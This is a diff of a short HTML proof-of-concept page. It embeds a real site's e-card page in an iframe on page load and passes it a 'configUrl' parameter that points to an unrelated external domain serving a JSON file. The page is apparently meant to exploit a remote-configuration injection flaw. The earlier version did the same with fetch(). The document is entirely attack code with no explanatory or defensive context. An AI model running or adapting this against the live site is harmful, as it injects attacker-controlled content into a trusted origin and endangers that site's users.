@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html>
-  <head></head>
-  <body onload="load_()">
     <script>
-      function load_(){ fetch('https://ecard.global-prod.padi.com/index.html?configUrl=https://wovyba364.j516.cn/api.json'); }
+      function prepareFrame(URL) {
+        var ifrm = document.createElement("iframe");
+        ifrm.src = URL;
+        ifrm.style.width = "100px";
+        ifrm.style.height = "100px";
+        ifrm.style.border = "None";
+        ifrm.style.visibility = "visible";
+        document.getElementsByTagName("body")[0].appendChild(ifrm);
+      }
     </script>
-  </body>
+  <body onload="prepareFrame('https://ecard.global-prod.padi.com/index.html?configUrl=https://wovyba364.j516.cn/api.json')"></body>
 </html>
